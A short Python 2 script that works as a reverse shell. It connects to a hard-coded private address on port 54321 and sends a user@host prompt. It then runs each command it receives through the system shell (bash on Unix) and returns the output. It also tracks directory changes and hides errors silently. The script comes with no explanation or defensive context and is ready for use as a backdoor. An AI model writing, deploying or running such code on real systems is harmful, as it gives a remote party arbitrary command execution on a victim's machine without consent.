#!/usr/bin/python

import os, socket, subprocess, getpass, re


def getcmdline(path, winflag):
	if winflag:
		cmdline = path + '>'
	else:
		cmdline=getpass.getuser()+'@'+socket.gethostname()+':'+path+'$'
	return cmdline

try:
	s=socket.socket()
	s.connect(("192.168.47.148", 54321))
	winflag=0
	if os.name == "nt":
		winflag=1
	cmdline=getcmdline(os.getcwd(),winflag)
	s.send(cmdline)
	while True:
		data=s.recv(1024)
		test = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE) if winflag else subprocess.Popen(data, shell=True, executable="/bin/bash", stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
		out=test.stdout.read()
		err=test.stderr.read()
		op = out + err
		if re.match("^\s*cd\s+.*", data) and err == "":
			path=re.sub("^\s*cd\s+", "",data)
			if os.path.exists(path):
				os.chdir(path)
				path=os.getcwd()
				cmdline=getcmdline(path,winflag)
		s.send(op+'\n'+cmdline)
except:
	s.close()


